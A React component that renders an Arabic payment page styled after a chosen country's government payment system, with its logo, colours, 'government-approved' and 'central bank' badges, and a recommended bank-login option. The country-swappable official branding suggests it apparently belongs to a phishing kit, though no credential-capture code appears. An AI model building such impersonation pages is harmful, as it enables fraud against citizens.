import React, { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { getGovernmentPaymentSystem, GovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
import { formatCurrency, getCurrencyCode } from '@/lib/countryCurrencies';
import { 
  Shield, 
  Lock, 
  CheckCircle2, 
  CreditCard,
  Building2,
  Globe,
  Clock,
  AlertCircle,
  ArrowRight,
  Smartphone,
  Wallet
} from 'lucide-react';

interface DynamicPaymentGatewayProps {
  countryCode: string;
  amount: number;
  serviceName?: string;
  invoiceNumber?: string;
  onPaymentMethodSelect: (method: 'card' | 'bank') => void;
}

export const DynamicPaymentGateway: React.FC<DynamicPaymentGatewayProps> = ({ 
  countryCode, 
  amount, 
  serviceName = 'خدمة حكومية',
  invoiceNumber,
  onPaymentMethodSelect 
}) => {
  const govSystem = getGovernmentPaymentSystem(countryCode);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'bank'>('bank');
  const formattedAmount = formatCurrency(amount, countryCode);
  const currencyCode = getCurrencyCode(countryCode);

  const handleProceed = () => {
    onPaymentMethodSelect(paymentMethod);
  };

  return (
    <div 
      className="min-h-screen" 
      style={{ backgroundColor: govSystem.colors.background }}
      dir="rtl"
    >
      <div 
        className="relative h-32 sm:h-40"
        style={{ background: govSystem.gradients.header }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/20 to-transparent" />
        
        <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6 relative z-10">
          <div className="flex items-center gap-3 sm:gap-4">
            <div 
              className="bg-white p-2 sm:p-3 rounded-xl shadow-lg"
              style={{ boxShadow: govSystem.shadows.lg }}
            >
              {govSystem.logo && (
                <img 
                  src={govSystem.logo} 
                  alt={govSystem.nameAr} 
                  className="h-10 sm:h-14 object-contain" 
                />
              )}
            </div>
            <div className="text-white">
              <h1 className="font-bold text-xl sm:text-2xl mb-0.5">{govSystem.nameAr}</h1>
              <p className="text-xs sm:text-sm opacity-90">{govSystem.nameEn}</p>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <Badge 
              className="hidden sm:flex items-center gap-1 px-3 py-1.5"
              style={{ 
                backgroundColor: 'rgba(255, 255, 255, 0.25)',
                backdropFilter: 'blur(10px)',
                border: '1px solid rgba(255, 255, 255, 0.3)',
                color: 'white'
              }}
            >
              <Shield className="w-4 h-4" />
              <span className="text-xs font-semibold">معتمد حكومياً</span>
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 sm:gap-3 mb-6 sm:mb-8">
          {[
            { icon: Shield, text: 'آمن', desc: 'تشفير متقدم', color: govSystem.colors.primary },
            { icon: Lock, text: 'مشفر', desc: 'SSL 256-bit', color: govSystem.colors.secondary },
            { icon: Globe, text: '24/7', desc: 'على مدار الساعة', color: govSystem.colors.primary },
            { icon: CheckCircle2, text: 'فوري', desc: 'تنفيذ لحظي', color: govSystem.colors.secondary }
          ].map((item, idx) => (
            <Card 
              key={idx}
              className="p-3 sm:p-4 text-center border-2 hover:scale-105 transition-all duration-200"
              style={{ 
                borderColor: `${item.color}30`,
                background: govSystem.gradients.card
              }}
            >
              <div 
                className="w-10 h-10 sm:w-12 sm:h-12 mx-auto rounded-full flex items-center justify-center mb-2"
                style={{ backgroundColor: `${item.color}15` }}
              >
                <item.icon className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: item.color }} />
              </div>
              <p className="font-bold text-xs sm:text-sm mb-0.5">{item.text}</p>
              <p className="text-[10px] sm:text-xs text-gray-600">{item.desc}</p>
            </Card>
          ))}
        </div>

        <div className="max-w-4xl mx-auto">
          <Card 
            className="p-4 sm:p-8 shadow-2xl mb-6"
            style={{ boxShadow: govSystem.shadows.xl }}
          >
            <div 
              className="flex flex-col sm:flex-row items-start sm:items-center gap-4 mb-6 pb-6 border-b-2"
              style={{ borderBottomColor: govSystem.colors.primary }}
            >
              <div 
                className="w-14 h-14 sm:w-16 sm:h-16 rounded-2xl flex items-center justify-center shrink-0"
                style={{ background: govSystem.gradients.primary }}
              >
                <CreditCard className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
              </div>
              <div className="flex-1">
                <h2 className="text-xl sm:text-3xl font-bold mb-1">بوابة الدفع الحكومية</h2>
                <p className="text-sm text-gray-600">{serviceName}</p>
                {invoiceNumber && (
                  <p className="text-xs text-gray-500 mt-1">رقم الفاتورة: {invoiceNumber}</p>
                )}
              </div>
              <div 
                className="px-4 sm:px-6 py-2 sm:py-3 rounded-xl sm:rounded-2xl text-white font-bold text-lg sm:text-2xl shrink-0 shadow-lg"
                style={{ 
                  backgroundColor: govSystem.colors.primary,
                  boxShadow: govSystem.shadows.lg
                }}
              >
                {formattedAmount}
              </div>
            </div>

            <div className="space-y-6">
              <div>
                <h3 className="text-lg sm:text-xl font-bold mb-4 flex items-center gap-2">
                  <Wallet className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: govSystem.colors.primary }} />
                  اختر طريقة الدفع
                </h3>
                
                <RadioGroup 
                  value={paymentMethod} 
                  onValueChange={(value) => setPaymentMethod(value as 'card' | 'bank')}
                  className="space-y-3"
                >
                  <Card
                    className={`p-4 sm:p-5 cursor-pointer transition-all duration-200 border-2 hover:scale-[1.02] ${
                      paymentMethod === 'bank' ? 'ring-2 ring-offset-2' : ''
                    }`}
                    style={{
                      borderColor: paymentMethod === 'bank' ? govSystem.colors.primary : govSystem.colors.border,
                      background: paymentMethod === 'bank' ? `${govSystem.colors.primary}08` : 'white',
                      ringColor: paymentMethod === 'bank' ? govSystem.colors.primary : 'transparent',
                    }}
                    onClick={() => setPaymentMethod('bank')}
                  >
                    <div className="flex items-center gap-4">
                      <RadioGroupItem value="bank" id="bank" className="shrink-0" />
                      <div className="flex-1">
                        <Label htmlFor="bank" className="flex items-center gap-2 sm:gap-3 cursor-pointer">
                          <div 
                            className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center shrink-0"
                            style={{ 
                              background: govSystem.gradients.primary,
                              boxShadow: govSystem.shadows.sm
                            }}
                          >
                            <Building2 className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
                          </div>
                          <div>
                            <p className="font-bold text-base sm:text-lg">تسجيل الدخول للبنك</p>
                            <p className="text-xs sm:text-sm text-gray-600">الدفع عبر {govSystem.nameAr} مباشرة</p>
                          </div>
                        </Label>
                      </div>
                      <Badge 
                        className="shrink-0 px-2 py-1"
                        style={{ 
                          backgroundColor: `${govSystem.colors.primary}20`,
                          color: govSystem.colors.primary 
                        }}
                      >
                        موصى به
                      </Badge>
                    </div>
                    <Separator className="my-3" />
                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 pr-8 sm:pr-12">
                      {govSystem.paymentMethods.map((method, idx) => (
                        <div 
                          key={idx}
                          className="flex items-center gap-1.5 text-xs text-gray-700"
                        >
                          <CheckCircle2 className="w-3 h-3" style={{ color: govSystem.colors.primary }} />
                          {method}
                        </div>
                      ))}
                    </div>
                  </Card>

                  <Card
                    className={`p-4 sm:p-5 cursor-pointer transition-all duration-200 border-2 hover:scale-[1.02] ${
                      paymentMethod === 'card' ? 'ring-2 ring-offset-2' : ''
                    }`}
                    style={{
                      borderColor: paymentMethod === 'card' ? govSystem.colors.primary : govSystem.colors.border,
                      background: paymentMethod === 'card' ? `${govSystem.colors.primary}08` : 'white',
                      ringColor: paymentMethod === 'card' ? govSystem.colors.primary : 'transparent',
                    }}
                    onClick={() => setPaymentMethod('card')}
                  >
                    <div className="flex items-center gap-4">
                      <RadioGroupItem value="card" id="card" className="shrink-0" />
                      <div className="flex-1">
                        <Label htmlFor="card" className="flex items-center gap-2 sm:gap-3 cursor-pointer">
                          <div 
                            className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center shrink-0"
                            style={{ backgroundColor: `${govSystem.colors.secondary}20` }}
                          >
                            <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: govSystem.colors.secondary }} />
                          </div>
                          <div>
                            <p className="font-bold text-base sm:text-lg">بطاقة ائتمانية</p>
                            <p className="text-xs sm:text-sm text-gray-600">Visa, Mastercard, Mada</p>
                          </div>
                        </Label>
                      </div>
                    </div>
                  </Card>
                </RadioGroup>
              </div>

              <Button 
                onClick={handleProceed}
                className="w-full h-12 sm:h-14 text-base sm:text-lg font-bold shadow-lg hover:shadow-xl transition-all duration-200"
                style={{ 
                  backgroundColor: govSystem.colors.primary,
                  color: govSystem.colors.textOnPrimary
                }}
              >
                <span>متابعة الدفع</span>
                <ArrowRight className="w-5 h-5 sm:w-6 sm:h-6 mr-2" />
              </Button>
            </div>
          </Card>

          <div 
            className="p-4 sm:p-6 rounded-xl sm:rounded-2xl text-white shadow-lg"
            style={{ background: govSystem.gradients.primary }}
          >
            <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4">
              <div 
                className="w-12 h-12 sm:w-16 sm:h-16 rounded-full bg-white/20 flex items-center justify-center shrink-0"
                style={{ backdropFilter: 'blur(10px)' }}
              >
                <Building2 className="w-6 h-6 sm:w-8 sm:h-8" />
              </div>
              <div className="flex-1">
                <h3 className="font-bold text-base sm:text-lg mb-1">{govSystem.nameAr} - {govSystem.nameEn}</h3>
                <p className="text-xs sm:text-sm opacity-90 leading-relaxed">
                  {govSystem.description}
                </p>
                {govSystem.website && (
                  <p className="text-xs opacity-80 mt-2">{govSystem.website}</p>
                )}
              </div>
            </div>
          </div>

          <div className="mt-4 grid grid-cols-1 sm:grid-cols-3 gap-3">
            <Card className="p-4 bg-green-50 border-green-200">
              <div className="flex items-center gap-2">
                <CheckCircle2 className="w-5 h-5 text-green-700 shrink-0" />
                <div>
                  <p className="font-bold text-sm text-green-900">معتمد حكومياً</p>
                  <p className="text-xs text-green-700">البنك المركزي</p>
                </div>
              </div>
            </Card>

            <Card className="p-4 bg-blue-50 border-blue-200">
              <div className="flex items-center gap-2">
                <Lock className="w-5 h-5 text-blue-700 shrink-0" />
                <div>
                  <p className="font-bold text-sm text-blue-900">تشفير SSL</p>
                  <p className="text-xs text-blue-700">256-bit encryption</p>
                </div>
              </div>
            </Card>

            <Card className="p-4 bg-purple-50 border-purple-200">
              <div className="flex items-center gap-2">
                <Clock className="w-5 h-5 text-purple-700 shrink-0" />
                <div>
                  <p className="font-bold text-sm text-purple-900">فوري</p>
                  <p className="text-xs text-purple-700">تنفيذ لحظي</p>
                </div>
              </div>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DynamicPaymentGateway;
